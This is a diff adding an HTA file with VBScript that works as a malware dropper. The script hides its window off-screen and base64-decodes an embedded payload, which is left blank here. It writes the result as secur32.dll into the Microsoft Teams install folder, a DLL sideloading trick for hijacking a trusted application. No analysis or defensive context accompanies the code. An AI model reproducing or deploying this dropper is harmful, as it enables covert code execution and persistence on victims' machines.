@@ -1,0 +1,34 @@
+<script language="VBScript">
+  window.moveTo -4000, -4000
+  Set oShell = CreateObject("WScript.Shell")
+  strHomeFolder = oShell.ExpandEnvironmentStrings("%LOCALAPPDATA%")
+  outputFile = strHomeFolder + "\Microsoft\Teams\current\secur32.dll"
+  payload = ""
+  Dim oXML, oNode
+  Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+  Set oNode = oXML.CreateElement("base64")
+  oNode.dataType = "bin.base64"
+  oNode.text = payload
+
+  Dim BinaryStream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+  BinaryStream.Type = 1
+  BinaryStream.Open
+  BinaryStream.Write oNode.nodeTypedValue
+  BinaryStream.Position = 0
+  BinaryStream.Type = 2
+  BinaryStream.CharSet = "us-ascii"
+  Base64Decoded = BinaryStream.ReadText
+  Set BinaryStream = Nothing
+  'BinaryStream.SaveToFile outputFile
+
+  Dim oFSO: Set oFSO = CreateObject("Scripting.FileSystemObject")
+  Dim oTxtStream
+  Set oTxtStream = oFSO.createTextFile(outputFile)
+  Set oTxtStream = Nothing
+  With oFSO.createTextFile(outputFile)
+      .Write(Base64Decoded)
+      .Close
+  End With
+  window.Close()
+</script>
